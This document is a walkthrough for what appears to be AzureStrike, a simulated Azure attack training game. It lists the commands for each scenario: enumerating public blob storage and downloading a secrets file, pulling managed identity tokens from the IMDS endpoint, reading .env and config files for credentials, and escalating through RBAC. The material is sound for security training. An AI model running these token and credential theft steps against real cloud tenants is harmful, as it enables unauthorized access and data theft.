# AzureStrike - Scenario Walkthroughs

Step-by-step commands to complete each scenario. Use these as a reference or for testing.

---

## Scenario 01: Storage Misconfiguration Discovery

**Difficulty:** Beginner
**Launch:** `./azurestrike --scenario storage-breach`

### Objectives

1. **Discover Contoso's storage account endpoint** (50 pts)
2. **Enumerate containers in the storage account** (75 pts)
3. **Identify the publicly accessible backup container** (100 pts)
4. **Download and examine sensitive backup files** (150 pts)

### Walkthrough

```bash
# Step 1: Scan for storage accounts using company name patterns
scan storage --company contoso

# Step 2: List containers in the discovered account
curl https://contosostorage2024.blob.core.windows.net/?comp=list

# Step 3: Probe the backups container for public access
curl https://contosostorage2024.blob.core.windows.net/backups?comp=list

# Step 4: Download sensitive files
curl https://contosostorage2024.blob.core.windows.net/backups/secrets.txt
```

### Alternative Commands

```bash
# Direct account probe (also completes objective 1)
curl https://contosostorage2024.blob.core.windows.net/

# Download config file instead of secrets
curl https://contosostorage2024.blob.core.windows.net/backups/config-backup.tar

# Use cat shorthand for blob access
cat backups/secrets.txt
```

---

## Scenario 02: IMDS Token Theft

**Status:** Planned
**Difficulty:** Beginner

### Expected Commands (Preview)

```bash
# Access the Instance Metadata Service
curl -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Retrieve managed identity access token
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Use token to access Azure resources
az account get-access-token
```

---

## Scenario 03: Service Principal Exposure

**Status:** Planned
**Difficulty:** Beginner

### Expected Commands (Preview)

```bash
# List service principals
az ad sp list

# Find exposed credentials in environment/config
cat .env
cat config.json

# Test service principal access
az login --service-principal -u <app-id> -p <secret> --tenant <tenant-id>
```

---

## Scenario 04: NSG Misconfiguration

**Status:** Planned
**Difficulty:** Intermediate

### Expected Commands (Preview)

```bash
# List virtual machines
az vm list

# Check NSG rules
az network nsg rule list --nsg-name <nsg-name> -g <resource-group>

# Identify overly permissive rules (0.0.0.0/0, Any, etc.)
```

---

## Scenario 05: Privilege Escalation via RBAC

**Status:** Planned
**Difficulty:** Intermediate

### Expected Commands (Preview)

```bash
# List role assignments
az role assignment list

# Check current user permissions
az ad signed-in-user show

# Escalate privileges via misconfigured RBAC
```

---

## Quick Reference

| Scenario | Command | Status |
|----------|---------|--------|
| 01 - Storage Breach | `./azurestrike --scenario storage-breach` | Complete |
| 02 - IMDS Token Theft | `./azurestrike --scenario imds-theft` | Planned |
| 03 - SP Exposure | `./azurestrike --scenario sp-exposure` | Planned |
| 04 - NSG Misconfig | `./azurestrike --scenario nsg-misconfig` | Planned |
| 05 - RBAC Escalation | `./azurestrike --scenario rbac-escalation` | Planned |

---

## Terminal Controls

| Key | Action |
|-----|--------|
| `Up/Down` | Command history |
| `Page Up/Down` | Scroll output |
| `Shift+Up/Down` | Scroll output |
| `Mouse wheel` | Scroll output |
| `Home/End` | Jump to top/bottom |
| `Ctrl+L` | Clear terminal |
| `Ctrl+C` | Quit game |
